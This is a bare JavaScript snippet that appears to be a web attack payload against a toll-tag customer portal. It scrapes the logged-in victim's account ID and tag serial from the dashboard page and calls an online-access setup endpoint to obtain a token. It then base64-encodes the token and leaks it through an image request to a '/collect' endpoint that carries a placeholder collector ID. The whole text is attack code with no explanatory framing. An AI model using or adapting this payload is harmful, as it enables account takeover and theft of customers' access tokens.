fetch('/dashboard')
  .then(r => r.text())
  .then(html => {
    var id = html.match(/data-account-id="([^"]+)"/)[1];
    var serial = html.match(/data-serial="([^"]+)"/)[1];
    return fetch('/api/v1/customers/' + id + '/setuponlineaccesstolltag?SerialNumber=' + serial);
  })
  .then(r => r.text())
  .then(token => new Image().src = '/collect?id=COLLECT_ID&d=' + btoa(token));
